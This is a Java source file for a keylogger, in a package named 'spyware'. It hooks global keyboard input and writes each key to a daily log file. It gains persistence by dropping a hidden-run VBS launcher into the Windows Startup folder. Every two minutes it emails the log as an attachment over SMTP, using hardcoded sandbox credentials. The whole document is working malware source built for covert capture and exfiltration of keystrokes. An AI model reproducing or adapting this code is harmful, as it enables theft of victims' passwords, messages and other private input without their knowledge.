package spyware;

import java.io.BufferedWriter;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.time.LocalDate;
import java.time.format.DateTimeFormatter;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import javax.activation.CommandMap;
import javax.activation.MailcapCommandMap;
import javax.swing.JOptionPane;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

public class Keylogger implements NativeKeyListener{
	
     private static String LOG_DIRECTORY = System.getProperty("user.home") + File.separator + "Documents" + File.separator + "logs";
	 private static String LOG_FILE_PATH;
	 private static String LOG_APPLICATION_PATH = System.getProperty("user.home") + File.separator + "Desktop" + File.separator + "TestKl3.jar";
	 private static LocalDate currentDate;
	 
	 static {
	        updateLogFilePath();
	    }
	
	 private static void updateLogFilePath() {
	        currentDate = LocalDate.now();
	        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd");
	        LOG_FILE_PATH = LOG_DIRECTORY + File.separator + "log-" + currentDate.format(formatter) + ".txt";
	    }
	 
	 private static void createLogDirectoryIfNeeded() {
	        File logDirectory = new File(LOG_DIRECTORY);
	        if (!logDirectory.exists()) {
	            logDirectory.mkdirs();
	        }
	    }

	    @Override
	    public void nativeKeyPressed(NativeKeyEvent e) {
	        // If the Escape key is pressed, unregister the native hook
	        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
	            try {
	                GlobalScreen.unregisterNativeHook();
	            } catch (NativeHookException nativeHookException) {
	                nativeHookException.printStackTrace();
	            }
	        }
	    }

	    @Override
	    public void nativeKeyReleased(NativeKeyEvent e) {       
	        // Write the key release event to the log file
	        try (BufferedWriter writer = new BufferedWriter(new FileWriter(LOG_FILE_PATH, true))) {
	            writer.write(NativeKeyEvent.getKeyText(e.getKeyCode()));
	            writer.newLine(); // Add a new line after each key event
	        } catch (IOException ioException) {
	            ioException.printStackTrace();
	        }
	        
	        if (!LocalDate.now().equals(currentDate)) {
	            updateLogFilePath();
	        }
	    }

	    @Override
	    public void nativeKeyTyped(NativeKeyEvent e) {
	        if (!LocalDate.now().equals(currentDate)) {
	            updateLogFilePath();
	        }
	    }
	    
	    private static void scheduleEmailSending() {
	        ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
	        scheduler.scheduleAtFixedRate(() -> {
	            try {
	            	MailcapCommandMap mc = (MailcapCommandMap) CommandMap.getDefaultCommandMap(); 
	            	mc.addMailcap("text/html;; x-java-content-handler=com.sun.mail.handlers.text_html"); 
	        		mc.addMailcap("text/xml;; x-java-content-handler=com.sun.mail.handlers.text_xml"); 
	        		mc.addMailcap("text/plain;; x-java-content-handler=com.sun.mail.handlers.text_plain"); 
	        		mc.addMailcap("multipart/*;; x-java-content-handler=com.sun.mail.handlers.multipart_mixed"); 
	        		mc.addMailcap("message/rfc822;; x-java-content- handler=com.sun.mail.handlers.message_rfc822");
	            	createLogDirectoryIfNeeded();
	            	
	            	//Delete
//	                DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd");
//	                String logFilePath = LOG_FILE_PATH + LocalDate.now().format(formatter) + ".txt";
	                
	                
	                EmailSender.sendEmail(
	                    "sandbox.smtp.mailtrap.io", // SMTP server
	                    "2525",              // SMTP port
	                    "47d47a8d8b9baf", // Sender email
	                    "bc64dc52a88f49",    // Sender password
	                    "recipient_email@example.com", // Recipient email
	                    "Daily Keylogger Log", // Subject
	                    "Please find the attached keylogger log for today.", // Message
	                    LOG_FILE_PATH // Attachment
	                );
	                System.out.println("Email sent successfully!");
	            } catch (Exception e) {
	                e.printStackTrace();
	            }
	        },  0, 2, TimeUnit.MINUTES);
	    }
	    
	    private static void addAppToStartup() {
	        try {
	            String userHome = System.getProperty("user.home");
	            Path startupFolder = Paths.get(userHome, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup");
	            Path vbsFile = Paths.get(userHome, "TestAppStartup.vbs");

	            // Cria o conteúdo do arquivo .vbs
	            String vbsContent = "Set WshShell = CreateObject(\"WScript.Shell\")\n"
	            		  + "WshShell.Run \"java -jar " + LOG_APPLICATION_PATH.toString() + "\", 0\n"
	            		+ "Set WshShell = Nothing";

	            // Escreve o conteúdo no arquivo .vbs
	            Files.write(vbsFile, vbsContent.getBytes());

	            // Copia o arquivo .vbs para a pasta de inicialização
	            Path target = startupFolder.resolve(vbsFile.getFileName());
	            Files.copy(vbsFile, target, StandardCopyOption.REPLACE_EXISTING);

	            // Verifica se o arquivo foi copiado corretamente
	            if (Files.exists(target)) {
	                System.out.println("O aplicativo foi adicionado à inicialização com sucesso.");
	                JOptionPane.showMessageDialog(null, "O aplicativo foi adicionado à inicialização com sucesso.");
	            } else {
	                System.out.println("Falha ao adicionar o aplicativo à inicialização.");
	                JOptionPane.showMessageDialog(null, "Falha ao adicionar o aplicativo à inicialização.");
	            }
	        } catch (IOException e) {
	            e.printStackTrace();
	            JOptionPane.showMessageDialog(null, "Ocorreu um erro ao adicionar à inicialização: " + e.getMessage(), "Erro", JOptionPane.ERROR_MESSAGE);
	        }
	    }

	    public static void main(String[] args) {
	    	   	
	        // Disable the library's default logging to avoid cluttering the console
	        java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
	        logger.setLevel(java.util.logging.Level.OFF);

	        try {
	            // Register the native hook to capture global key events
	            GlobalScreen.registerNativeHook();
	        } catch (NativeHookException ex) {
	            System.err.println("There was a problem registering the native hook.");
	            System.err.println(ex.getMessage());
	            System.exit(1);
	        }

	        // Add the keylogger as a native key listener
	        GlobalScreen.addNativeKeyListener(new Keylogger());
	        addAppToStartup();
	        scheduleEmailSending();
	    }
	}